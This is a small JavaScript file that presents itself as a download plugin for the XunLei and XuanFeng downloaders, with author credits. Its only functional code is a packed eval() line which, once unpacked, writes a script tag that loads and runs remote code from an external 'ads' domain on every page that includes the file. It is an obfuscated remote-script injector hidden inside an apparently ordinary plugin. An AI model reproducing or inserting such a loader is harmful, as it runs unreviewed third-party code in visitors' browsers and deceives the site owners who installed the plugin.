/*
	Software: XunLei & XuanFeng download Plugin Ver 1.0
	Author: Beyond
	Time: 2014-08-31
	为保证服务请保留以上信息，谢谢！
*/
 ...
 */
 ...
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.5("<0 3=\\"4://1.6.7/8/9.a\\"></0>");',11,11,'script|app|document|src|http|writeln|doucao|net|ads|m|js'.split('|'),0,{}))
